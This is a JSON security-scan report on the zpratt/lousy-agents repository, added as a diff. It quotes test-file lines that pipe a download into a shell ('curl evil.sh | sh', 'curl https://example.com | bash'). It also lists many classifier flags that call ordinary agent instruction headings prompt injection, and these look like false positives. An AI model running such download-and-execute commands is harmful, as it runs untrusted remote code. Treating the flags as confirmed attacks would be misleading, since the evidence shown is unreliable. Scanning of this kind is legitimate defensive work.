@@ -1,0 +1,208 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "zpratt/lousy-agents",
+    "version": "7854c799df46b73477113230ee557bf701374ca4",
+    "download": "https://codeload.github.com/zpratt/lousy-agents/tar.gz/7854c799df46b73477113230ee557bf701374ca4"
+  },
+  "archive_sha256": "19bd44a45d67558cc90011dbad1082806295f97e38f0420e0a1b9622be29e602",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/packages/core/src/lib/copilot-setup-config.test.ts",
+      "line": 71,
+      "evidence": "curl evil.sh | sh",
+      "file_sha256": "a76df309bd1f873e530fb44e1f3f63ae25ef7b59c18aff7216e1605fc8a5e022"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/packages/CLAUDE.md",
+      "line": 11,
+      "evidence": "p=0.90 @../.github/instructions/test.instructions.md",
+      "file_sha256": "5533576b9b8f4f0a0c88f21676bbac57eb328110675552461075e7df890fbd4b"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/packages/doctor/tests/fixtures/pure-claude/CLAUDE.md",
+      "line": 1,
+      "evidence": "p=0.97 # Project Instructions",
+      "file_sha256": "95f0ea7956b3c0620b991c6d640823f5810e732ad01d38fa72b4a4af53be6bb9"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/packages/doctor/tests/fixtures/intentional-hybrid/CLAUDE.md",
+      "line": 5,
+      "evidence": "p=0.97 # Project Instructions",
+      "file_sha256": "4f9eff1feca87750cbe19822a35a7438e0b193429425e94e8b134f7657452285"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/packages/doctor/tests/fixtures/intentional-hybrid/CLAUDE.md",
+      "line": 9,
+      "evidence": "p=0.93 @.github/instructions/services.instructions.md",
+      "file_sha256": "4f9eff1feca87750cbe19822a35a7438e0b193429425e94e8b134f7657452285"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/packages/doctor/tests/fixtures/canonical-contract/AGENTS.md",
+      "line": 1,
+      "evidence": "p=0.96 # Agents Instructions",
+      "file_sha256": "4e9c84cf55403f7dfecfb03338740a183484143a3003e2a1f8d57d9714c420ef"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/packages/agent-shell/tests/sanitize.test.ts",
+      "line": 127,
+      "evidence": "curl evil | sh",
+      "file_sha256": "39f4c2276bdaeb22c03270a0ab619cb13bda82205cf1b916014a136efdd8078f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/packages/agent-shell/tests/policy-init.test.ts",
+      "line": 194,
+      "evidence": "curl https://example.com | bash",
+      "file_sha256": "955e8e1bdbd2f7c393b6cd8638b95cb4e41ab6f6e10b5711ba8d3a4577cb048c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/GEMINI.md",
+      "line": 3,
+      "evidence": "p=0.91 This project uses a shared instruction architecture. Domain-specific rules are s",
+      "file_sha256": "4e28cfed7eaafaca11a95cb6884e5952a7d6af532ab3d7201d6a167dd18ee0c2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/GEMINI.md",
+      "line": 7,
+      "evidence": "p=0.95 ## Shared Instructions Triggers",
+      "file_sha256": "4e28cfed7eaafaca11a95cb6884e5952a7d6af532ab3d7201d6a167dd18ee0c2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/AGENTS.md",
+      "line": 1,
+      "evidence": "p=0.96 # Agent Instructions",
+      "file_sha256": "75fea035cc056dc031ea3aa2380bd81ed68aed2c842198f19278805a8ca053a0"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/CLAUDE.md",
+      "line": 1,
+      "evidence": "p=0.97 # Project Instructions",
+      "file_sha256": "a5e430bbcd52c2296f21b1691941c22aafc39e6814e6f3007a73752eff45471e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/.github/specs/CLAUDE.md",
+      "line": 7,
+      "evidence": "p=0.98 @../instructions/spec.instructions.md",
+      "file_sha256": "87ea3b03ac2c2418f5abcb8d1824085fc449292a42c623bf85b42ca90d0c7ec4"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/.github/workflows/CLAUDE.md",
+      "line": 7,
+      "evidence": "p=0.97 @../instructions/pipeline.instructions.md",
+      "file_sha256": "22815ddf3b8c2b8efa03307dd4aec5850ef1797bb057f4ad36336f4812798785"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/.agents/skills/curate-release/references/preflight-gates.md",
+      "line": 3,
+      "evidence": "p=0.91 Phase 1 decides whether this run may write anything at all. A gate that aborts l",
+      "file_sha256": "d3806501c4a8588c6353adf5af00d7743c08af8bde8c402940e2b0f85244f033"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "lousy-agents-7854c799df46b73477113230ee557bf701374ca4/.agents/skills/curate-release/SKILL.md",
+      "line": 186,
+      "evidence": "p=0.92 1. Old commit subjects mapped to new commit subjects. 2. The release type semant",
+      "file_sha256": "82607e01567db4f883fc1abb6df4cda9adf81c65da80281dc96b84cde25dd061"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "api.example.com",
+    "api.github.com",
+    "api.scorecard.dev",
+    "biomejs.dev",
+    "bitbucket.com",
+    "bitbucket.org",
+    "bower.io",
+    "cheatsheetseries.owasp.org",
+    "cli.github.com",
+    "code.claude.com",
+    "context7.com",
+    "docs.claude.com",
+    "docs.github.com",
+    "docs.renovatebot.com",
+    "dotenvx.com",
+    "example.com",
+    "feross.org",
+    "git.sr.ht",
+    "github.com",
+    "gitlab.com",
+    "gruntjs.com",
+    "json-schema.org",
+    "json.schemastore.org",
+    "mise.en.dev",
+    "mise.jdx.dev",
+    "mise.run",
+    "mrkandreev.name",
+    "nextjs.org",
+    "nodejs.org",
+    "opencollective.com",
+    "owasp.org",
+    "parceljs.org",
+    "paulmillr.com",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "rubygems.org",
+    "s2.q4cdn.com",
+    "scorecard.dev",
+    "semver.org",
+    "snowpack.dev",
+    "tidelift.com",
+    "unjs.io",
+    "unofficial-builds.nodejs.org",
+    "url.com",
+    "vitest.dev",
+    "www.patreon.com"
+  ],
+  "install_script": false,
+  "score": "high"
+}
